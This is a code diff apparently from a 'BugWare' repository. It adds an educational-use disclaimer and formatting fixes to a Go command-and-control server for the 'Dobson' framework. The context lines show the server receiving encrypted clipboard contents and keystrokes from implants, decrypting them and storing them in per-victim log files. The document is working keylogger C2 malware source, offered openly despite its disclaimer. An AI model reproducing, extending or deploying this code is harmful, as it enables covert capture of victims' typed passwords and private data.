@@ -1,3 +1,18 @@
+// -------------------------------------------------------------------------
+// SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
+// This script is part of the BugWare repository, a collection of security tools
+// and PoCs for learning about attack vectors.
+// DO NOT USE THIS FOR ILLEGAL PURPOSES.
+// -------------------------------------------------------------------------
+
+/*
+Program: Dobson Server
+Description: Central Command and Control (C2) server for the Dobson framework, written in Go.
+Author: CyberPanther232
+Suite: BugWare
+Version: 1.0
+*/
+
 package main
 
 import (
@@ -36,7 +51,6 @@ func createMidgeFile(id string) error {
 
 	return nil
 }
-
 
 func storeData(filename string, data []byte) error {
 	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
@@ -111,7 +125,6 @@ func main() {
 	fmt.Println("Public Key:", publicKey)
 	fmt.Println("Private Key:", privateKey)
 
-
 	// Serve static assets (CSS/JS)
 	fs := http.FileServer(http.Dir("static"))
 	http.Handle("/static/", http.StripPrefix("/static/", fs))
@@ -175,7 +188,7 @@ func main() {
 		}
 
 		// Check for required fields
-		if data["id"] == "" || data["clipboard"] == "" || data["keystrokes"] == "" || data["nonce"] == "" || data["pubkey"] == ""{
+		if data["id"] == "" || data["clipboard"] == "" || data["keystrokes"] == "" || data["nonce"] == "" || data["pubkey"] == "" {
 			fmt.Println("Error: Missing data")
 			http.Error(w, "Missing payload data", http.StatusBadRequest)
 			return
@@ -185,8 +198,6 @@ func main() {
 		id := data["id"]
 
 		fmt.Printf("Received data from ID: %s\n", id)
-
-
 
 		// 1. Get Nonce (required for NaCL)
 		nonceHex := data["nonce"]
@@ -258,9 +269,9 @@ func main() {
 		}
 
 		filename := filepath.Join(midgeDir, fmt.Sprintf("midge_%s.txt", id))
-		
+
 		logEntry := processLogData(string(plainClipboard), string(plainKeystrokes))
-		
+
 		if err := storeData(filename, []byte(logEntry)); err != nil {
 			fmt.Printf("Error storing data for ID %s: %v\n", id, err)
 			// Don't fail the request if storage fails, but log it
@@ -342,4 +353,3 @@ func main() {
 		fmt.Println("Server error:", err)
 	}
 }
-
